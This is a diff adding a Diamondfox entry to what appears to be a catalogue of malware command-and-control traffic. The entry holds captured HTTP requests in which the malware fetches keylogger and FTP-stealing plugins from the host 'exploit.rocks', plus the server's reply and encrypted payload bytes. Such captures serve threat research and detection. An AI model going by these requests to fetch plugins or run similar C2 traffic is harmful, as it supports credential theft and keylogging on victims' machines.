@@ -399,6 +399,43 @@ bff12793b8731a7f138e454a576ed1b5
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/delf.png "Delf Loader")
 
+#### Diamondfox
+~~~
+GET /plugins/keylogger.p HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Host: exploit.rocks
+Connection: Keep-Alive
+
+I..Dw..o.............?."..zoh:.X4.O..CCUT:WV.HF7#.h......zE...:oj'vV..>X
+..O..&?.x..a.s.l.A1....D.... loU....G^......l.:.....u.......8..Lq[..N`.]...n..Qy...Q.nn.........}eF.C...;N9.lI@P.f.}g.....V~.lf>)...T..@.(..c-V..yOOe.....6.L/.D...~...p.
+
+GET /plugins/ftp.p HTTP/1.1
+User-Agent: vb wininet
+Host: exploit.rocks
+
+HTTP/1.1 200 OK
+Date: Mon, 22 Apr 2019 19:53:57 GMT
+Server: Apache
+Last-Modified: Sun, 19 Jul 2015 09:20:08 GMT
+ETag: "15e0360-4000-51b36ed5c8200"
+Accept-Ranges: bytes
+Content-Length: 16384
+Vary: Accept-Encoding,User-Agent
+Content-Type: text/x-pascal
+
+..)..7C4J=K9..H;.#W R!W%.*\/]/[,f.c.a.`.i.o.j.o.u.t.u.s.~
+{	..x..l.~....,.
+3.^_...3.c	w.x.?.{.q.QrF2.%V:.4Eym.{{\,S%.L:O.J<O=O;L.T.jL6.;D;.0G9.5n../Y'.,....T..#........................W.T.........e...................%.......................................AcG0B!G5.oL?O?K<V%C!Q6P#Y+O(Z9.....1W5M:L?M?K<V%..Q&x#Y+_hZ)O-e.d.e.c.n.k.i.h.q.w.r.w.}
+|.}.{..u.q.v.s	{.x
+y.}.b.g.g.d.m.i.n.k!S.R"Q.U-Z,O-_c\6E3A1F0C9K?H:I?M..................K.......................................k..............................+....................................@.Fu/..|P3I;O8J9O=U".t.e.ih.um.bC2F:L9M8L<J#W&R&P%Q,X(^/[*^.d.e.d.b.o.j.h.i.p.v.s.v
+|	}.|.zs.v.v.u.|.x...z.b.a.`.d.k.n.n.m.T P&W#R&Z,Y-X,\*C7F2F0E1L8H>O;J>..........................................................................................................................rrrrw.3G6B6@5A<H8N?K:N"T!U T$R+_.Z.X.....@5A<H8N?K:N"T!U T$R+_.Z.X-Y.`.f.c.f.l.m.l.j.w.r.p.q.x.~.{
+~r.q.p.t.{.~
+~.}	d.`.g.b.j.i.h.l.S'V"V U!\(X._+Z.B4A5@4D2K?N:N8M9..........................................................................................................................squuq.2D1E0D4B;O>J>H=I$P V'S"V*\)](\7C4N=K9I>H;Q#W R!W%]*\/]/[,f.c.a.`.i.o.j.o.u.t.u.s.~
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/diamondfox.png "Diamondfox")
+
 #### Donotgroup
 ~~~
 POST /ze/volad/uzi HTTP/1.1
